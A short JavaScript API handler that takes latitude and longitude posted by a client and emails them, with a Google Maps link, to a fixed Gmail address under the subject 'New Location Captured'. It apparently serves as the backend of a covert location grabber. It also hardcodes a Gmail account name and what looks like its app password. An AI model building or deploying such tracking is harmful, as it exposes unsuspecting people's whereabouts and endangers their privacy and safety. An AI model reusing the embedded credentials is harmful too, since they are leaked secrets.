const nodemailer = require("nodemailer");

export default async function handler(req, res) {
  if (req.method === "POST") {
    const { lat, lon } = req.body;

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "muhfaizan7861230@gmail.com",
        pass: "zpoh xsor kfga fzsx"
      }
    });

    const mailOptions = {
      from: "muhfaizan7861230@gmail.com",
      to: "muhfaizan7861230@gmail.com",
      subject: "📍 New Location Captured",
      text: `Latitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`
    };

    try {
      await transporter.sendMail(mailOptions);
      console.log("✅ Email sent!");
      res.status(200).end();
    } catch (error) {
      console.error("❌ Email failed:", error);
      res.status(500).end();
    }
  } else {
    res.status(405).end();
  }
}
